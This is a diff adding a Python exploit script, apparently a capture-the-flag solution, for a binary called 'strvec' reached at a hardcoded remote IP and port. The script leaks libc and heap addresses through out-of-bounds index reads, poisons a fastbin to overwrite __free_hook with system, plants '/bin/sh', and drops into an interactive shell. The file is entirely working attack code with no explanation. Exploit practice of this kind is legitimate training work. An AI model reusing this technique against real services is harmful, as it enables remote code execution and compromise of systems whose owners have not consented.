@@ -1,0 +1,78 @@
+#!/usr/bin/env python3.9
+# -*- coding: utf-8 -*-
+from rootkit import *
+
+exe = context.binary = ELF('./strvec')
+
+host = args.HOST or '168.119.108.148'
+port = int(args.PORT or 12010)
+
+def start_local(argv=[], *a, **kw):
+    '''Execute the target binary locally'''
+    if args.GDB:
+        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
+    else:
+        return process([exe.path] + argv, *a, **kw)
+
+def start_remote(argv=[], *a, **kw):
+    '''Connect to the process on the remote host'''
+    io = connect(host, port)
+    if args.GDB:
+        gdb.attach(io, gdbscript=gdbscript)
+    return io
+
+def start(argv=[], *a, **kw):
+    '''Start the exploit against the target.'''
+    if args.LOCAL:
+        return start_local(argv, *a, **kw)
+    else:
+        return start_remote(argv, *a, **kw)
+
+gdbscript = '''
+tbreak main
+continue
+'''.format(**locals())
+
+# -- Exploit goes here --
+
+def cmd(option):
+    sla(b"> ", str(option).encode('utf-8'))
+
+def get_(idx):
+    cmd(1)
+    sla(b"idx = ", str(idx).encode('utf'))
+
+def set_(idx, data):
+    cmd(2)
+    sla(b"idx = ", str(idx).encode('utf'))
+    sla(b"data = ", data)
+
+
+libc = ELF("libc.so.6")
+io = start()
+
+io.sendlineafter("Name: ", "AAA")
+io.sendlineafter("n = ", str(0x20097969))        # malloc big chunk to map new memory region 
+
+# leak libc
+get_((0xd516d+17))
+libc.address = u64(io.recvline()[16:16+6] + b"\x00\x00") - 0x1ebbe0
+success("libc: %s"%hex(libc.address)) 
+malloc_hook = libc.symbols["__malloc_hook"]
+free_hook = libc.symbols["__free_hook"]
+system = libc.symbols["system"]
+success("system: %s"%hex(system))
+success("free_hook: %s"%hex(free_hook))
+success("malloc_hook: %s"%hex(malloc_hook))
+
+# leak heap base
+get_(0xd517b)
+heap_base = u64(io.recvline()[16:16+6] + b"\x00\x00") - 0x280
+success("heap base: %s"%hex(heap_base))
+
+# play with fastbin in main arenas
+set_(0xd5170, p64(heap_base + 0x280) + p64(0x31) + p64(free_hook-0x10))
+set_(2, "/bin/sh\x00\n")
+set_(3, p64(system))
+io.interactive()
+
